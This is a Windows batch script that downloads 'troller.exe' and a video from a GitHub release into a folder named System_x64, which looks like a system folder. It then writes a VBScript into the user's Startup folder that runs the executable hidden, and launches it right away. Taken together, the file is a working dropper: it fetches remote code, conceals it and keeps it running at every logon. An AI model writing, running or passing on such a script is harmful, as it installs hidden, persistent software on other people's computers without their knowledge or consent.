@echo off
set DOWNLOAD_FOLDER=%userprofile%\System_x64
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set VBS_FILE=%STARTUP_FOLDER%\run_silently.vbs

:: create download folder if it doesn't exist
if not exist "%DOWNLOAD_FOLDER%" (
    mkdir "%DOWNLOAD_FOLDER%"
)

:: download the executable and the video file
curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%DOWNLOAD_FOLDER%\troller.exe"
curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troll_in_suit.mp4" -o "%DOWNLOAD_FOLDER%\troll in suit.mp4"


:: check if the files are downloaded
if exist "%DOWNLOAD_FOLDER%\troller.exe" (
    echo troller.exe downloaded successfully.
) else (
    echo Failed to download troller.exe.
    exit /b 1
)

if exist "%DOWNLOAD_FOLDER%\troll in suit.mp4" (
    echo troll in suit.mp4 downloaded successfully.
) else (
    echo Failed to download troll in suit.mp4.
    exit /b 1
)

:: create the VBScript to run the .exe file silently
echo Set objShell = CreateObject("WScript.Shell") > "%VBS_FILE%"
echo exeFilePath = "%DOWNLOAD_FOLDER%\troller.exe" >> "%VBS_FILE%"
echo objShell.Run "cmd /c start /b /min " ^& exeFilePath, 0, False >> "%VBS_FILE%"

:: check if the VBScript is created
if exist "%VBS_FILE%" (
    echo VBScript created successfully.
) else (
    echo Failed to create VBScript.
    exit /b 1
)

:: run the executable immediately using the VBScript
cscript //nologo "%VBS_FILE%"

:: check if the process started
echo Waiting for troller.exe to start...
timeout /t 5 /nobreak

tasklist /fi "imagename eq troller.exe"

:: ensure the VBScript runs at startup
cscript //nologo "%VBS_FILE%"

echo Files have been moved to System_x64 folder, VBScript created to run troller.exe silently, and executed.
pause
